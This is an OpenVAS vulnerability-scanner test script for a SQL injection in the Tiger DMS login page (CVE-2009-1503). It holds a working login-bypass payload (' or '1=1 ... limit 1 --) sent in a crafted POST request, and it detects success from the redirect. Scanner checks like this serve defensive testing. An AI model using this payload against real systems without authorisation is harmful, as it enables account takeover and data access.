###############################################################################
# OpenVAS Vulnerability Test
# $Id: tiger_dms_34775.nasl 14325 2019-03-19 13:35:02Z asteins $
#
# Tiger DMS Login SQL Injection Vulnerability
#
# Authors:
# Michael Meyer
#
# Copyright:
# Copyright (c) 2009 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.100173");
  script_version("$Revision: 14325 $");
  script_tag(name:"last_modification", value:"$Date: 2019-03-19 14:35:02 +0100 (Tue, 19 Mar 2019) $");
  script_tag(name:"creation_date", value:"2009-05-02 19:46:33 +0200 (Sat, 02 May 2009)");
  script_cve_id("CVE-2009-1503");
  script_bugtraq_id(34775);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_name("Tiger DMS Login SQL Injection Vulnerability");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2009 Greenbone Networks GmbH");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_tag(name:"summary", value:"Tiger DMS is prone to an SQL-injection vulnerability because it
 fails to sufficiently sanitize user-supplied data before using it in
 an SQL query.");
  script_tag(name:"impact", value:"Exploiting this issue could allow an attacker to compromise the
 application, access or modify data, or exploit latent
 vulnerabilities in the underlying database.");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/34775");

  script_tag(name:"qod_type", value:"remote_app");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);
if(!can_host_php(port:port))exit(0);

foreach dir( make_list_unique( "/dms", cgi_dirs( port:port ) ) ) {

  if( dir == "/" ) dir = "";
  url = string(dir, "/login.php");
  buf = http_get_cache(item:url, port:port);
  if( buf == NULL )continue;

  if(egrep(pattern: 'Powered by <a href=[^>]+>Tiger DMS</a>', string: buf) ) {

    host = http_host_name( port:port );
    sess = eregmatch(pattern: "Set-Cookie: ([a-zA-Z0-9]+)=([a-f0-9]{32})", string: buf);

    variables = string(sess[1],"=",sess[2],"&username=%27%20or%20%271=1&password=%27%20or%20%271=1%27%20limit%201%20--%20&login=Submit");
    url = string(dir,"/login.php");

    req = string(
      "POST ", url, " HTTP/1.1\r\n",
      "Referer: ","http://", host, url, "\r\n",
      "Host: ", host, "\r\n",
      "Content-Type: application/x-www-form-urlencoded\r\n",
      "Content-Length: ", strlen(variables),
      "\r\n\r\n",
      variables );

    res = http_send_recv(port:port, data:req, bodyonly:FALSE);
    if( res == NULL )continue;

    if(egrep(pattern: "Location: index.php", string: res)) {
      report = report_vuln_url( port:port, url:url );
      security_message( port:port, data:report );
      exit( 0 );
    }
  }
}

exit( 99 );